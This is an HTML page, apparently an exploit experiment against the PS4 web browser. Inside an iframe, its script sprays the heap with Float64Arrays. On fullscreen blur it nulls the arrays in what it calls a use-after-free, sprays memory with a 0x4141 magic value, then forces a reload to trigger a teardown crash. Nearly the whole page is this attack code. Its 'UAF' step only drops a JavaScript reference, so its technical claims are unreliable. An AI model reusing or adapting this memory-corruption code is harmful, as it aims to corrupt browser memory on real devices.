<!DOCTYPE html>
<html>
<head>
    <title>PS4 Teardown: Reload Method</title>
    <style>
        body { background-color: #000; color: #fff; font-family: monospace; text-align: center; }
        iframe { width: 90%; height: 400px; border: 4px solid #ff0; background: #fff; margin: 20px auto; display: block;}
        #log { text-align: left; margin: 20px auto; width: 90%; border: 1px solid #555; padding: 10px; background: #111; color: #0f0; }
        button { padding: 10px 20px; font-size: 1.2em; cursor: pointer; background: #333; color: white; border: 1px solid #fff; }
    </style>
</head>
<body>

<h1>TEARDOWN: INTERNAL RELOAD</h1>
<h3>Simulando o botão "Atualizar" via JS</h3>

<iframe id="victim_frame" srcdoc="
    <html>
    <head>
        <style>
            body { background: #eef; color: #005; text-align: center; font-family: sans-serif; padding: 20px; }
            button { padding: 15px 30px; font-size: 1.2em; cursor: pointer; background: #005; color: white; border: none; margin: 10px; }
            .danger { background: #d00; }
        </style>
    </head>
    <body>
        <h2>DENTRO DO IFRAME</h2>
        
        <button onclick='prepare()'>1. PREPARAR MEMÓRIA</button>
        <br>
        <button class='danger' onclick='go()'>2. GATILHO (FULLSCREEN)</button>
        <div id='status'>Aguardando...</div>

        <script>
            var victims = [];
            var spray = [];
            const COUNT = 15000;
            const MAGIC = 2.121995791e-314; // 0x4141...

            function logParent(msg) {
                try { window.parent.document.getElementById('log').innerHTML += '>> ' + msg + '<br>'; } catch(e){}
            }

            function prepare() {
                logParent('Alocando arrays...');
                for(let i=0; i<COUNT; i++) {
                    let v = new Float64Array(16);
                    v.fill(1.1);
                    victims.push(v);
                }
                document.getElementById('status').innerText = 'MEMÓRIA PRONTA.';
                logParent('Heap preparado.');
            }

            function triggerReload() {
                logParent('⚠️ EXECUTANDO location.reload()...');
                document.getElementById('status').innerText = 'ATUALIZANDO PÁGINA...';
                
                // ESTA É A SIMULAÇÃO DO BOTÃO ATUALIZAR
                // O 'true' força o recarregamento do servidor (ignorando cache)
                // O que obriga o teardown completo.
                window.location.reload(true);
            }

            function go() {
                var el = document.documentElement;
                var rfs = el.webkitRequestFullscreen || el.requestFullscreen;
                rfs.call(el);

                window.onblur = function() {
                    logParent('BLUR DETECTADO! Iniciando corrupção...');
                    
                    // 1. UAF
                    victims = null;
                    
                    // 2. SPRAY
                    for(let i=0; i<COUNT*2; i++) {
                        let s = new Float64Array(24);
                        s.fill(MAGIC);
                        spray.push(s);
                    }
                    
                    logParent('Memória corrompida via Spray.');
                    logParent('Disparando reload em 500ms...');

                    // 3. O RELOAD MORTAL
                    // Damos um pequeno tempo para o UAF assentar
                    setTimeout(triggerReload, 500);
                };
            }
        </script>
    </body>
    </html>
"></iframe>

<div id="log">Logs do Sistema Principal...</div>
<br>
<button onclick="window.location.reload()">Resetar Tudo</button>

</body>
</html>
